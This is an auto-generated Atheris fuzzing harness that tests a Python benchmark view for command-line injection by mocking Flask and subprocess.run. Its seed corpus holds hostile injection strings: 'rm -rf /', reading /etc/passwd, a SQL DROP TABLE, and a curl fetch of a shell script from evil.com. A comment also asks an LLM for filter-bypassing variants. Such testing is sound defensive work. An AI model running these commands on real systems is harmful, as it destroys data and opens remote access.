# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/command-line-injection
# function : BenchmarkTest00267_post
# file     : testcode/BenchmarkTest00267.py
# ================================================================
import atheris
import sys
import re
import os


from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/tuonglnc/repo/VulnHunterX/repos/python/benchmark-python"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from testcode.BenchmarkTest00267 import BenchmarkTest00267_post


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("[\\s\\S]+", re.IGNORECASE),

]
_RAISE_MESSAGE  = "ORACULUM_VIOLATION: captured={captured}"
_TAINTED_PARAMS = [{"name": "request", "index": -1, "type": "flask_request"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : subprocess.run
# target_arg_index : 0
# target_arg_name  : None
# input_strategy   : flask_view
# signature        : def BenchmarkTest00267_post()
# condition        : oracle condition
# capture_what     : captured value
# skip_hint        : False
# ========================================


# === RECORDED_CALL SKELETON ===
# 1. INPUT GENERATION
#    - Generate inputs for tainted params using FuzzedDataProvider.
#    - For MULTIPLE params: split the buffer proportionally by param count.
#      For str/bytes params divide remaining bytes evenly; consume the last
#      str/bytes param with remaining bytes. Fixed-size types (int, float,
#      bool) consume their natural byte width first.
#      FORBIDDEN: Do NOT use ConsumeIntInRange() to index a strategy or branch.
#    - DO NOT embed a seed list inside TestOneInput or use ConsumeBool() to
#      select from a hardcoded list — seeds are managed externally in _SEED_CORPUS.
#
# 2. SKIP CONDITION
#    - Apply skip_hint early, return immediately if not met.
#
# 3. MOCK SETUP
#    - Patch `subprocess.run` using `with patch(...) as mock_get:`.
#    - Return a realistic MagicMock so the function continues past the patched call.
#
# 4. ORACLE CHECK
#    - After the call, iterate mock_get.call_args_list.
#    - For each call: check call.args[0] first,
#      fall back to call.kwargs.get("None").
#    - Match against every pattern in _COMPILED_PATTERNS.
#    - On match → raise RuntimeError(_RAISE_MESSAGE)
#
# 5. EXCEPTION HANDLING
#    - except RuntimeError: raise   → never swallow oracle signals
#    - except Exception:    return  → only around the target function call
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # 1. INPUT GENERATION
    # Since there is only one tainted param "request" of type flask_request,
    # and it's at index -1, we will generate a dictionary simulating a Flask request.
    # For simplicity in this harness, we'll assume the request data is a JSON body.
    # We consume all remaining data as a string for the request body.
    request_data_str = fdp.ConsumeUnicodeNoSurrogates(fdp.remaining_bytes())

    # Early return for empty or trivial inputs
    if not request_data_str:
        return

    # Simulate a Flask request object with a get_json method
    class MockRequest:
        def get_json(self):
            try:
                import json
                return json.loads(request_data_str)
            except:
                return {}

    mock_request = MockRequest()

    # 2. SKIP CONDITION
    # skip_hint is False, so we don't skip

    # 3. MOCK SETUP
    with patch('subprocess.run', return_value=MagicMock()) as mock_run:
        try:
            # 4. CALL TARGET FUNCTION
            # The function BenchmarkTest00267_post() takes no arguments, but likely
            # accesses flask.request internally. We need to patch flask.request as well.
            with patch('testcode.BenchmarkTest00267.request', mock_request):
                BenchmarkTest00267_post()
        except Exception:
            # Catch exceptions from the target function and return to let fuzzer continue
            return

        # 5. ORACLE CHECK
        for call in mock_run.call_args_list:
            captured = None
            # Check positional arguments first
            if len(call.args) > 0:
                captured = call.args[0]
            # Fallback to keyword arguments if needed
            elif call.kwargs and 'None' in call.kwargs:
                captured = call.kwargs.get('None')

            if captured is not None:
                # Match against every pattern in _COMPILED_PATTERNS
                for pattern in _COMPILED_PATTERNS:
                    if pattern.match(str(captured)):
                        raise RuntimeError(_RAISE_MESSAGE.format(captured=captured))


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    '{"cmd": "ls -la"}',
    '{"cmd": "echo hello && rm -rf /"}',
    '{"input": "test; shutdown --help"}',
    '{"data": "payload | cat /etc/passwd"}',
    '{"query": "SELECT * FROM users; DROP TABLE logs"}',
    '{"action": "exec; curl http://evil.com/shell.sh"}',
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/benchmark-python/fuzz_corpus/py_command_line_injection_testcode_BenchmarkTest00267_py_55"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()